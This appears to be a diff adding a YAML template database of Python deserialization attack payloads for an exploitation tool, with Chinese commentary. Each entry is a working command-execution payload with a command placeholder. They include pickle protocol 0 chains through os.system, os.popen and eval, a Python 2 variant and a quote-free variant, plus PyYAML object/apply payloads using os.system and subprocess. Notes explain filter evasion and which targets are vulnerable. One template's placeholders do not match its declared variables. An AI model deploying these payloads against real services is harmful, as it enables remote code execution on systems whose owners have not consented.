@@ -1,0 +1,160 @@
+ruleDB: v0.1.0
+# Python 反序列化模板。
+#
+# pickle 有**协议 0**：纯 ASCII 文本。这让它落在本工具的文本载荷范围内，
+# 而协议 2+ 是二进制，就表达不了了。这是同一门技术里文本/二进制的分界。
+
+templates:
+  - id: deser.python.pickle.proto0
+    name: pickle 协议 0 命令执行
+    desc: 协议 0 是纯 ASCII 文本，每一行都以操作码结尾。载荷里的换行是格式的一部分
+    vuln: [deser]
+    content_type: [serialized]
+    component: [python]
+    version: "*"
+    body: |-
+      cos
+      system
+      (S'<<cmd>>'
+      tR.
+    vars: [cmd]
+    requires: [deser-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.python.pickle.proto0.eval
+    name: pickle 协议 0 任意表达式
+    desc: system 不可用时走 builtins.eval
+    vuln: [deser]
+    content_type: [serialized]
+    component: [python]
+    version: "*"
+    body: |-
+      cbuiltins
+      eval
+      (S'__import__("os").popen("<<cmd>>").read()'
+      tR.
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.python.yaml.load
+    name: yaml.load 命令执行
+    desc: 目标把 yaml.load 当成 yaml.safe_load 用的时候
+    vuln: [deser]
+    content_type: [yaml]
+    component: [python, pyyaml]
+    version: "<6.0"
+    body: '!!python/object/apply:os.system ["<<cmd>>"]'
+    vars: [cmd]
+    requires: [weak-hardening]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.python.pickle.b64
+    name: pickle 载荷的外层包装（外部生成器）
+    desc: 协议 2+ 是二进制，本工具表达不了。用外部生成器产出后 base64，贴进来，再用提交方式投递
+    vuln: [deser]
+    content_type: [raw]
+    component: [python]
+    version: "*"
+    body: "<<b64>>"
+    vars: [b64]
+    requires: [generator, deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.python.pickle.proto0.unicode
+    name: pickle 协议 0 · V 操作码（无引号）
+    desc: >-
+      协议 0 的字符串有两种写法：S'...' 用引号包，V... 读到行尾为止。
+      单引号被过滤时换这条——载荷里一个引号都没有，代价是命令里不能有换行。
+      注意 content_type 写的是 serialized，但本工具的序列化校验器只建模了 PHP，
+      pickle 会被报成「认不出的类型标记」——那是校验器没覆盖，不是载荷错了。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [python]
+    version: "*"
+    body: |-
+      cos
+      system
+      (V<<cmd>>
+      tR.
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.python.pickle.proto0.popen
+    name: pickle 协议 0 · os.popen 读回显
+    desc: >-
+      os.system 被禁（比如目标重写了 os 模块或只留了部分函数）时试 os.popen。
+      它返回文件对象，所以要让链上再调一次 read——单独用 R. 只执行不读回显。
+      要回显就把 eval 那条（deser.python.pickle.proto0.eval）拿出来用。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [python]
+    version: "*"
+    body: |-
+      cos
+      popen
+      (V<<cmd>>
+      tR.
+    vars: [cmd]
+    requires: [deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.python.pickle.proto0.py2
+    name: pickle 协议 0 · Python 2 模块名
+    desc: >-
+      Python 2 里内建模块的短名是 __builtin__，Python 3 才是 builtins。
+      原来那条 eval 链在 Python 2 目标上会 ModuleNotFoundError，
+      按目标的解释器版本二选一。
+    vuln: [deser]
+    content_type: [serialized]
+    component: [python]
+    version: "*"
+    body: |-
+      c__builtin__
+      eval
+      (S'__import__("os").popen("<<cmd>>").read()'
+      tR.
+    vars: [cmd]
+    requires: [deser-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.python.yaml.unsafe_load.subprocess
+    name: yaml.load · subprocess 走向
+    desc: >-
+      os.system 那条的替代：命令要带管道、重定向、引号时，绕过 shell 直接给
+      subprocess 一个 argv 列表更稳，也躲开 os.system 常被单独禁用的情况。
+      同样要求 yaml.load / yaml.full_load / yaml.unsafe_load 至少有一个在用
+      （6.0 起 load 默认走 SafeLoader，safe_load 从来就打不动）。
+    vuln: [deser]
+    content_type: [yaml]
+    component: [python, pyyaml]
+    version: "<6.0"
+    body: '!!python/object/apply:subprocess.check_output [["<<shell>>", "-c", "<<cmd>>"]]'
+    vars: [cmd]
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
